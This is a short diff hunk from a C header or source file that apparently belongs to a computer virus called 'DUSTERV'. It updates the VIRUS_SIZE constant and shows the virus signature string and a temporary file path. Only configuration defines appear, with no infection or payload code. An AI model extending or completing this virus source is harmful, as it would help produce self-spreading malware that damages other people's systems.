@@ -13,7 +13,7 @@
 #define DEBUGMODE	1
 #define VERBOSEMODE 1
 
-#define VIRUS_SIZE 12345
+#define VIRUS_SIZE 93488
 #define	VIRUS_SIGNATURE "DUSTERV"
 #define TEMPORARY_FILE_NAME "/tmp/dusterv"
 
